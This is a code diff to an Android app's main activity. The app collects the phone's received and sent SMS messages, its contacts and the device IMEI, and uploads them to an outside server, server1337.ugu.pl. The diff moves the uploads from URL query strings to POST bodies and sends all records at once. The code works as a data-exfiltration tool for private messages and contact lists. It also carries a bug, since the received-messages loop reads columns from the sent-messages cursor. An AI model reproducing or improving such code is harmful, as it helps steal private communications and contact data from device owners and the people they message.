@@ -15,7 +15,10 @@ import android.telephony.TelephonyManager;
 import android.view.View;
 import android.widget.TextView;
 
+import java.io.BufferedWriter;
 import java.io.IOException;
+import java.io.OutputStream;
+import java.io.OutputStreamWriter;
 import java.net.HttpURLConnection;
 import java.text.SimpleDateFormat;
 import java.util.Date;
@@ -28,7 +31,7 @@ public class MainActivity extends AppCompatActivity {
     private String IMEI;
     private Long dayInMs = 1000L * 60 * 60 * 24;
     private Date oneWeekAgo = new Date((new Date().getTime()) - (7 * dayInMs));
-    private String phoneNumber = "660022948";
+    private String phoneNumber = "516069840";
     private SimpleDateFormat parser = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
 
     @Override
@@ -56,16 +59,16 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    private void updateSentItemsforReceived(int i) {
-        odebSentText.setText(Integer.toString(i));
+    private void updateSentItemsforReceived(String resultCode) {
+        odebSentText.setText(resultCode);
     }
 
-    private void updateSentItemsforContacts(int i) {
-        contactsSentText.setText(Integer.toString(i));
+    private void updateSentItemsforContacts(String resultCode) {
+        contactsSentText.setText(resultCode);
     }
 
-    private void updateSentItemsforSent(int i) {
-        wyslSentText.setText(Integer.toString(i));
+    private void updateSentItemsforSent(String resultCode) {
+        wyslSentText.setText(resultCode);
     }
 
 
@@ -139,50 +142,45 @@ public class MainActivity extends AppCompatActivity {
     }
 
     public void sendReceived(View view){
-        @SuppressLint("StaticFieldLeak") AsyncTask<Void, Integer, Void> asyncTask = new AsyncTask<Void, Integer, Void>() {
+        @SuppressLint("StaticFieldLeak") AsyncTask<Void, String, Void> asyncTask = new AsyncTask<Void, String, Void>() {
             @Override
             protected Void doInBackground(Void... voids) {
                 String data="";
-                int i=0, j=0;
                 if(receivedCursor.moveToFirst()){
                     do {
-                        String date = parser.format(new Date(receivedCursor.getLong(5)));
-                        data += receivedCursor.getString(2) + "@!@"+
+                        String date = parser.format(new Date(receivedCursor.getLong(sentCoursor.getColumnIndex("date"))));
+                        data += receivedCursor.getString(sentCoursor.getColumnIndex("address")) + "@!@"+
                                 date + "@!@"+
-                                receivedCursor.getString(13)+ "@!@"+
+                                receivedCursor.getString(sentCoursor.getColumnIndex("body"))+ "@!@"+
                                 IMEI+"@@@";
-                        i++;
-                        if(i>=10){
-                            send(data);
-                            j+=i;
-                            i=0;
-                            data="";
-                            publishProgress(j);
-                        }
                     }while(receivedCursor.moveToNext());
-                    if(!data.equals("")){
-                        send(data);
-                        publishProgress(j+=i);
-                    }
+                    publishProgress(send(data));
                 }
                 return null;
             }
 
-            private void send(String data){
+            private String send(String data){
                 try {
                     data = data.replace(" ", "%20").replace("\n", "%20").replace("\r", "%20");
                     System.out.println(data);
-                    URL url = new URL("http://www.server1337.ugu.pl/saveMessage.php?data=" + data);
+                    URL url = new URL("http://www.server1337.ugu.pl/saveMessage.php");
                     HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
-                    urlConnection.getResponseCode();
-                    urlConnection.disconnect();
+                    urlConnection.setDoOutput(true);
+                    OutputStream os = urlConnection.getOutputStream();
+                    BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, "UTF-8"));
+                    writer.write("data="+data);
+                    writer.flush();
+                    writer.close();
+                    os.close();
+                    return urlConnection.getResponseMessage();
                 } catch (IOException e) {
                     e.printStackTrace();
                 }
+                return "error";
             }
 
             @Override
-            protected void onProgressUpdate(Integer... values) {
+            protected void onProgressUpdate(String... values) {
                 updateSentItemsforReceived(values[0]);
             }
 
@@ -233,50 +231,46 @@ public class MainActivity extends AppCompatActivity {
 
 
     public void sendSent(View view){
-        @SuppressLint("StaticFieldLeak") AsyncTask<Void, Integer, Void> asyncTask = new AsyncTask<Void, Integer, Void>() {
+        @SuppressLint("StaticFieldLeak") AsyncTask<Void, String, Void> asyncTask = new AsyncTask<Void, String, Void>() {
             @Override
             protected Void doInBackground(Void... voids) {
                 String data ="";
-                int i=0, j=0;
                 if (sentCoursor.moveToFirst()) {
                     do{
-                        String date = parser.format(new Date(sentCoursor.getLong(5)));
-                        data += sentCoursor.getString(2)+"@!@"+
+                        String date = parser.format(new Date(sentCoursor.getLong(sentCoursor.getColumnIndex("date"))));
+                        data += sentCoursor.getString(sentCoursor.getColumnIndex("address"))+"@!@"+
                                 date+"@!@"+
-                                sentCoursor.getString(13)+"@!@"+
+                                sentCoursor.getString(sentCoursor.getColumnIndex("body"))+"@!@"+
                                 IMEI+"@@@";
-                        i++;
-                        if(i>=10){
-                            send(data);
-                            j+=i;
-                            i=0;
-                            data="";
-                            publishProgress(j);
-                        }
+
                     }while(sentCoursor.moveToNext());
-                    if(!data.equals("")){
-                        send(data);
-                        publishProgress(j+=i);
-                    }
+                    publishProgress(send(data));
                 }
                 return null;
             }
 
-            private void send(String data){
+            private String send(String data){
                 try {
                     data = data.replace(" ", "%20").replace("\n", "%20").replace("\r", "%20");
                     System.out.println(data);
-                    URL url = new URL("http://www.server1337.ugu.pl/saveSentMessage.php?data=" + data);
+                    URL url = new URL("http://www.server1337.ugu.pl/saveSentMessage.php");
                     HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
-                    urlConnection.getResponseCode();
-                    urlConnection.disconnect();
+                    urlConnection.setDoOutput(true);
+                    OutputStream os = urlConnection.getOutputStream();
+                    BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, "UTF-8"));
+                    writer.write("data="+data);
+                    writer.flush();
+                    writer.close();
+                    os.close();
+                    return urlConnection.getResponseMessage();
                 }catch (IOException e){
                     e.printStackTrace();
                 }
+                return "error";
             }
 
             @Override
-            protected void onProgressUpdate(Integer... values) {
+            protected void onProgressUpdate(String... values) {
                 updateSentItemsforSent(values[0]);
             }
         };
@@ -290,10 +284,9 @@ public class MainActivity extends AppCompatActivity {
     }
 
     public void sendContacts(View view){
-        @SuppressLint("StaticFieldLeak") AsyncTask<Void, Integer, Void> asyncTask = new AsyncTask<Void, Integer, Void>() {
+        @SuppressLint("StaticFieldLeak") AsyncTask<Void, String, Void> asyncTask = new AsyncTask<Void, String, Void>() {
             @Override
             protected Void doInBackground(Void... voids) {
-                int i = 0, j=0;
                 String data = "";
                 if (contactsCoursor.moveToFirst()) {
                     do{
@@ -311,38 +304,35 @@ public class MainActivity extends AppCompatActivity {
                         data += contactsCoursor.getString(contactsCoursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))+";"+
                                 phoneNumber+";"+
                                 IMEI+"@@@";
-                        i++;
-                        if(i>=25){
-                            send(data);
-                            j+=i;
-                            i=0;
-                            data="";
-                            publishProgress(j);
-                        }
+
                     }while(contactsCoursor.moveToNext());
-                    if(!data.equals("")){
-                        send(data);
-                        publishProgress(j+=i);
-                    }
+                    publishProgress(send(data));
                 }
                 return null;
             }
 
-            private void send(String data){
+            private String send(String data){
                 try {
                     data = data.replace(" ", "%20").replace("\n", "%20").replace("\r", "%20");;;
                     System.out.println(data);
-                    URL url = new URL("http://www.server1337.ugu.pl/saveContacts.php?data=" + data);
+                    URL url = new URL("http://www.server1337.ugu.pl/saveContacts.php");
                     HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
-                    urlConnection.getResponseCode();
-                    urlConnection.disconnect();
+                    urlConnection.setDoOutput(true);
+                    OutputStream os = urlConnection.getOutputStream();
+                    BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, "UTF-8"));
+                    writer.write("data="+data);
+                    writer.flush();
+                    writer.close();
+                    os.close();
+                    return urlConnection.getResponseMessage();
                 }catch (IOException e){
                     e.printStackTrace();
                 }
+                return "error";
             }
 
             @Override
-            protected void onProgressUpdate(Integer... values) {
+            protected void onProgressUpdate(String... values) {
                 updateSentItemsforContacts(values[0]);
             }
         };
